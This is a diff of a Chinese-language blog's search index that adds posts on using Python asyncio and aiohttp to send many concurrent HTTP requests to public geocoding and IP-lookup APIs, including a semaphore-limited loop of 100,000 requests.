-    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">​```</span><br><span class="line">import asyncio</span><br><span class="line">import aiohttp</span><br><span class="line">import json</span><br><span class="line">def fetch_page(url):</span><br><span class="line">    try:</span><br><span class="line">        response = yield from aiohttp.request(&#x27;GET&#x27;, url)</span><br><span class="line">        string = (yield from response.read()).decode(&#x27;utf-8&#x27;)</span><br><span class="line">        if response.status == 200:</span><br><span class="line">            data = json.loads(string)</span><br><span class="line">            print(data)</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;data fetch failed for&quot;)</span><br><span class="line">            print(response.content, response.status)</span><br><span class="line">    except asyncio.TimeoutError:</span><br><span class="line">        print(&quot;访问失败&quot;)</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    url = &#x27;http://gc.ditu.aliyun.com/geocoding?a=%E8%8B%8F%E5%B7%9E%E5%B8%82&#x27;</span><br><span class="line">    # urls = [url] * 4</span><br><span class="line">    loop = asyncio.get_event_loop()</span><br><span class="line">    tasks = []</span><br><span class="line">    for i in range(5):</span><br><span class="line">        tasks.append(asyncio.async(fetch_page(url)))</span><br><span class="line">    # tasks = [asyncio.async(fetch_page(z, i)) for i, z in enumerate(urls)]</span><br><span class="line">    print(tasks)</span><br><span class="line">    loop.run_until_complete(asyncio.wait(tasks, timeout=5))</span><br><span class="line">    loop.close()</span><br><span class="line">​```</span><br><span class="line"></span><br><span class="line">封装一次</span><br><span class="line"></span><br><span class="line">​```</span><br><span class="line">class fetch():</span><br><span class="line">    def __init__(self, dict_http):</span><br><span class="line">        &#x27;&#x27;&#x27;</span><br><span class="line">        http请求的封装，传入dict</span><br><span class="line">        :param dict_http:</span><br><span class="line">        &#x27;&#x27;&#x27;</span><br><span class="line">        self.dict_http = dict_http</span><br><span class="line">    def get(self, url, param):</span><br><span class="line">        data = &#123;&#125;</span><br><span class="line">        url = self.dict_http[&quot;protocol&quot;] + self.dict_http[&quot;host&quot;] + &quot;:&quot; + str(self.dict_http[&quot;port&quot;]) + url</span><br><span class="line">        print(url)</span><br><span class="line">        try:</span><br><span class="line">            response = yield from aiohttp.request(&quot;GET&quot;, url, headers=self.dict_http[&quot;header&quot;], params=param)</span><br><span class="line">            string = (yield from response.read()).decode(&#x27;utf-8&#x27;)</span><br><span class="line">            if response.status == 200:</span><br><span class="line">                data = json.loads(string)</span><br><span class="line">            else:</span><br><span class="line">                print(&quot;data fetch failed for&quot;)</span><br><span class="line">                print(response.content, response.status)</span><br><span class="line">            data[&quot;status_code&quot;] = response.status</span><br><span class="line">            print(data)</span><br><span class="line">        except asyncio.TimeoutError:</span><br><span class="line">            print(&quot;访问失败&quot;)</span><br><span class="line">        return data</span><br><span class="line">    def post(self,url, param):</span><br><span class="line">        data = &#123;&#125;</span><br><span class="line">        url = self.dict_http[&quot;protocol&quot;] + self.dict_http[&quot;host&quot;] + &#x27;:&#x27; + str(self.dict_http[&quot;port&quot;]) + url</span><br><span class="line">        try:</span><br><span class="line">            response = yield from aiohttp.request(&#x27;POST&#x27;, url, data=param)</span><br><span class="line">            string = (yield from response.read()).decode(&#x27;utf-8&#x27;)</span><br><span class="line">            if response.status == 200:</span><br><span class="line">                data = json.loads(string)</span><br><span class="line">            else:</span><br><span class="line">                print(&quot;data fetch failed for&quot;)</span><br><span class="line">                print(response.content, response.status)</span><br><span class="line">            data[&quot;status_code&quot;] = response.status</span><br><span class="line">            print(data)</span><br><span class="line">        except asyncio.TimeoutError:</span><br><span class="line">            print(&quot;访问失败&quot;)</span><br><span class="line">        return data</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    url = &#x27;/iplookup/iplookup.php&#x27;</span><br><span class="line">    loop = asyncio.get_event_loop()</span><br><span class="line">    tasks = []</span><br><span class="line">    dict_http = &#123;&#125;</span><br><span class="line">    dict_http[&quot;protocol&quot;] = &quot;http://&quot;</span><br><span class="line">    dict_http[&quot;host&quot;] = &quot;int.dpool.sina.com.cn&quot;</span><br><span class="line">    dict_http[&quot;port&quot;] = 80</span><br><span class="line">    dict_http[&quot;header&quot;] = &#123;&quot;Accept&quot;:&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;,&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.59 Safari/537.36&quot;&#125;</span><br><span class="line">    f = fetch(dict_http)</span><br><span class="line">    for i in range(2):</span><br><span class="line">        tasks.append(asyncio.async(f.get(url, param=&quot;format=json&amp;ip=218.4.255.255&quot;)))</span><br><span class="line">    loop.run_until_complete(asyncio.wait(tasks, timeout=5))</span><br><span class="line">    loop.close()</span><br><span class="line"></span><br><span class="line">​```</span><br></pre></td></tr></table></figure>
+    <title>py3-5-aiohttp-百万请求？</title>
+    <url>/aposts/8d7c7783/</url>
+    <content><![CDATA[<ul>
+<li><p>找到了一篇英文文章说的就是构造百万级别http请求</p>
+</li>
+<li><p><a href="http://pawelmhm.github.io/asyncio/python/aiohttp/2016/04/22/asyncio-aiohttp.html">http://pawelmhm.github.io/asyncio/python/aiohttp/2016/04/22/asyncio-aiohttp.html</a> </p>
+</li>
+<li><p>作者对各个请求给服务器造成的情况作出了详细的对比。我就偷个懒没有。。。</p>
+</li>
+<li><p>基于py3.5 3.4的语法请自行度娘</p>
+</li>
+</ul>
+<h2 id="例子一"><a href="#例子一" class="headerlink" title="例子一"></a>例子一</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">from</span> aiohttp <span class="keyword">import</span> ClientSession</span><br><span class="line"><span class="comment"># 　你使用async以及await关键字将函数异步化</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">fetch</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> ClientSession() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">async</span> <span class="keyword">with</span> session.get(url) <span class="keyword">as</span> response:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">await</span> response.read()</span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">loop,  r</span>):</span><br><span class="line">    url = <span class="string">&quot;http://gc.ditu.aliyun.com/geocoding?a=苏州市&quot;</span></span><br><span class="line">    tasks = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(r):</span><br><span class="line">        task = asyncio.ensure_future(fetch(url.<span class="built_in">format</span>(i)))</span><br><span class="line">        tasks.append(task)</span><br><span class="line"></span><br><span class="line">    responses = <span class="keyword">await</span> asyncio.gather(*tasks)</span><br><span class="line">    <span class="comment"># 注意asyncio.gather()的用法，它搜集所有的Future对象，然后等待他们返回。</span></span><br><span class="line">    <span class="comment"># print(json.loads(responses[0].decode()))</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(responses))</span><br><span class="line"></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">future = asyncio.ensure_future(run(loop, <span class="number">800</span>))</span><br><span class="line">loop.run_until_complete(future)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<ul>
+<li>future &#x3D; asyncio.ensure_future(run(loop, 800)) 这里 构造1000个请求时，就报too many open files loop is not close 作者也遇到此问题，说是本机的socket 端口用光了？很是怀疑</li>
+</ul>
+<h2 id="例子二-asyncio-Semaphore解决报错问题"><a href="#例子二-asyncio-Semaphore解决报错问题" class="headerlink" title="例子二 asyncio.Semaphore解决报错问题"></a>例子二 asyncio.Semaphore解决报错问题</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">from</span> aiohttp <span class="keyword">import</span> ClientSession</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">fetch</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> ClientSession() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">async</span> <span class="keyword">with</span> session.get(url) <span class="keyword">as</span> response:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">await</span> response.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">bound_fetch</span>(<span class="params">sem, url</span>):</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> sem:</span><br><span class="line">        <span class="keyword">await</span> fetch(url)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">loop,  r</span>):</span><br><span class="line">    url = <span class="string">&quot;http://gc.ditu.aliyun.com/geocoding?a=苏州市&quot;</span></span><br><span class="line">    tasks = []</span><br><span class="line">    <span class="comment"># create instance of Semaphore</span></span><br><span class="line">    sem = asyncio.Semaphore(<span class="number">100</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(r):</span><br><span class="line">        <span class="comment"># pass Semaphore to every GET request</span></span><br><span class="line">        task = asyncio.ensure_future(bound_fetch(sem, url.<span class="built_in">format</span>(i)))</span><br><span class="line">        tasks.append(task)</span><br><span class="line"></span><br><span class="line">    responses = <span class="keyword">await</span> asyncio.gather(*tasks)</span><br><span class="line">    <span class="built_in">print</span>(responses)</span><br><span class="line">number = <span class="number">100000</span></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line"></span><br><span class="line">future = asyncio.ensure_future(run(loop, number))</span><br><span class="line">loop.run_until_complete(future)</span><br></pre></td></tr></table></figure>
+<ul>
+<li>然而我用asyncio.Semaphore时，发现请求不成功，已经发了邮件给作者，没有回我。</li>
+</ul>
 ]]></content>
       <categories>
         <category>python</category>
@@ -10534,6 +10525,15 @@
         <tag>airtest</tag>
         <tag>pytest</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>python+asyncio发送请求</title>
+    <url>/aposts/aab677c5/</url>
+    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">​```</span><br><span class="line">import asyncio</span><br><span class="line">import aiohttp</span><br><span class="line">import json</span><br><span class="line">def fetch_page(url):</span><br><span class="line">    try:</span><br><span class="line">        response = yield from aiohttp.request(&#x27;GET&#x27;, url)</span><br><span class="line">        string = (yield from response.read()).decode(&#x27;utf-8&#x27;)</span><br><span class="line">        if response.status == 200:</span><br><span class="line">            data = json.loads(string)</span><br><span class="line">            print(data)</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;data fetch failed for&quot;)</span><br><span class="line">            print(response.content, response.status)</span><br><span class="line">    except asyncio.TimeoutError:</span><br><span class="line">        print(&quot;访问失败&quot;)</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    url = &#x27;http://gc.ditu.aliyun.com/geocoding?a=%E8%8B%8F%E5%B7%9E%E5%B8%82&#x27;</span><br><span class="line">    # urls = [url] * 4</span><br><span class="line">    loop = asyncio.get_event_loop()</span><br><span class="line">    tasks = []</span><br><span class="line">    for i in range(5):</span><br><span class="line">        tasks.append(asyncio.async(fetch_page(url)))</span><br><span class="line">    # tasks = [asyncio.async(fetch_page(z, i)) for i, z in enumerate(urls)]</span><br><span class="line">    print(tasks)</span><br><span class="line">    loop.run_until_complete(asyncio.wait(tasks, timeout=5))</span><br><span class="line">    loop.close()</span><br><span class="line">​```</span><br><span class="line"></span><br><span class="line">封装一次</span><br><span class="line"></span><br><span class="line">​```</span><br><span class="line">class fetch():</span><br><span class="line">    def __init__(self, dict_http):</span><br><span class="line">        &#x27;&#x27;&#x27;</span><br><span class="line">        http请求的封装，传入dict</span><br><span class="line">        :param dict_http:</span><br><span class="line">        &#x27;&#x27;&#x27;</span><br><span class="line">        self.dict_http = dict_http</span><br><span class="line">    def get(self, url, param):</span><br><span class="line">        data = &#123;&#125;</span><br><span class="line">        url = self.dict_http[&quot;protocol&quot;] + self.dict_http[&quot;host&quot;] + &quot;:&quot; + str(self.dict_http[&quot;port&quot;]) + url</span><br><span class="line">        print(url)</span><br><span class="line">        try:</span><br><span class="line">            response = yield from aiohttp.request(&quot;GET&quot;, url, headers=self.dict_http[&quot;header&quot;], params=param)</span><br><span class="line">            string = (yield from response.read()).decode(&#x27;utf-8&#x27;)</span><br><span class="line">            if response.status == 200:</span><br><span class="line">                data = json.loads(string)</span><br><span class="line">            else:</span><br><span class="line">                print(&quot;data fetch failed for&quot;)</span><br><span class="line">                print(response.content, response.status)</span><br><span class="line">            data[&quot;status_code&quot;] = response.status</span><br><span class="line">            print(data)</span><br><span class="line">        except asyncio.TimeoutError:</span><br><span class="line">            print(&quot;访问失败&quot;)</span><br><span class="line">        return data</span><br><span class="line">    def post(self,url, param):</span><br><span class="line">        data = &#123;&#125;</span><br><span class="line">        url = self.dict_http[&quot;protocol&quot;] + self.dict_http[&quot;host&quot;] + &#x27;:&#x27; + str(self.dict_http[&quot;port&quot;]) + url</span><br><span class="line">        try:</span><br><span class="line">            response = yield from aiohttp.request(&#x27;POST&#x27;, url, data=param)</span><br><span class="line">            string = (yield from response.read()).decode(&#x27;utf-8&#x27;)</span><br><span class="line">            if response.status == 200:</span><br><span class="line">                data = json.loads(string)</span><br><span class="line">            else:</span><br><span class="line">                print(&quot;data fetch failed for&quot;)</span><br><span class="line">                print(response.content, response.status)</span><br><span class="line">            data[&quot;status_code&quot;] = response.status</span><br><span class="line">            print(data)</span><br><span class="line">        except asyncio.TimeoutError:</span><br><span class="line">            print(&quot;访问失败&quot;)</span><br><span class="line">        return data</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    url = &#x27;/iplookup/iplookup.php&#x27;</span><br><span class="line">    loop = asyncio.get_event_loop()</span><br><span class="line">    tasks = []</span><br><span class="line">    dict_http = &#123;&#125;</span><br><span class="line">    dict_http[&quot;protocol&quot;] = &quot;http://&quot;</span><br><span class="line">    dict_http[&quot;host&quot;] = &quot;int.dpool.sina.com.cn&quot;</span><br><span class="line">    dict_http[&quot;port&quot;] = 80</span><br><span class="line">    dict_http[&quot;header&quot;] = &#123;&quot;Accept&quot;:&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;,&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.59 Safari/537.36&quot;&#125;</span><br><span class="line">    f = fetch(dict_http)</span><br><span class="line">    for i in range(2):</span><br><span class="line">        tasks.append(asyncio.async(f.get(url, param=&quot;format=json&amp;ip=218.4.255.255&quot;)))</span><br><span class="line">    loop.run_until_complete(asyncio.wait(tasks, timeout=5))</span><br><span class="line">    loop.close()</span><br><span class="line"></span><br><span class="line">​```</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>python</category>
+      </categories>
   </entry>
   <entry>
     <title>python django实践</title>
